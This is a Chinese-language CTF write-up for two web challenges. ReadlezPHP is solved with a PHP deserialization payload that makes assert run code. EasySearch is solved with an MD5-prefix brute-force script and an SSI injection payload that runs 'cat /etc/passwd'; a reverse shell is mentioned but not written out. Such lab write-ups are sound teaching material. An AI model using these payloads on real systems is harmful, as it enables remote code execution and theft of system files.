---
title: ReadlezPHP&EasySearch
date: 2021-04-20 17:12:43
categories: ['CTF']
tags: ['反序列化','SSI注入']
cover: https://cdn.jsdelivr.net/gh/penginman/PicBed@master/cover/20201120223513.jpg
---

# ReadlezPHP



源码找到`time.php?source`

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175641.png)

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在`HelloPhp`中有一个`__destruct`方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如`$a($b)`格式进行函数调用，假如变量`a`为字符串`var_dump`，`b`是任意字符串，就相当于调用var_dump函数且参数为b。

所以构造反序列化，调用assert函数执行phpinfo。如果向**assert()** 函数传递字符串，它将会被 **assert()** 当做 PHP 代码来执行)：

```
<?php
class HelloPhp
{
    public $a='phpinfo()';
    public $b='assert';
}

$s=new HelloPhp();
echo serialize($s);

```

POST请求

```
time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```

页面查找flag，在environment中找到flag

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175822.png)

# EasySearch

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420171541.png)

进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到`index.php.swp`文件：

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

登陆功能又一个验证，需要传入的`passwd`参数使用**md5**加密以后是以**6d0bc1**开头的。简单写个脚本跑一下就有了：

```python
# codeing=utf-8
import hashlib

cnt=1;
while True:
    md=hashlib.md5(str(cnt).encode("utf8")).hexdigest()
    if md.startswith("6d0bc1"):
        print(cnt)
    cnt+=1
#2020666
#2305004
```

分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210417102904.png)

看了看文件后缀是一格没有见过的：`shtml`，然后学到到了shtml有一种漏洞：[SSI注入漏洞](https://blog.csdn.net/qq_40657585/article/details/84260844)

> SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。

简单的命令执行

```code
"-->'-->`--><<!--#exec cmd="cat /etc/passwd"-->
```

我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为`flag_990c66bf85a09c664f0b6741840499b2`的文件，获得flag